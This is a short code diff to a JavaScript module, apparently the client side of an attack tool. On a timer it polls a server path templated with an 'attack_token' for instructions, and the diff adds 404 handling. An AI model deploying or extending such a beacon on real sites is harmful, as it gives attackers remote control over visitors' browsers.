@@ -1,6 +1,6 @@
 lefish = (function() {
 
-    let timer = 10000;
+    let timer = 9000;
     let intervalId = undefined;
 
     function reschedule(milliseconds) {
@@ -29,24 +29,18 @@ lefish = (function() {
 
     function task() {
         console.log('task()');
-        //reschedule(timer + 1);
         getInstruction();
     }
 
     function getInstruction() {
         console.log('getInstruction()');
         
-        /*
-        fetch('/instruction/[[attack_token]]', {
-            method: 'GET'
-        })
-        .then(response => response.text())
-        .then(data => console.log('Response:', data))
-        .catch(error => console.error('Error:', error));
-        */
-
         fetch('/instruction/[[attack_token]]')
         .then(response => {
+            if (response.status === 404) {
+                console.warn('404, no instruction.');
+                return null;
+            }
             if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
             return response.text();
         })
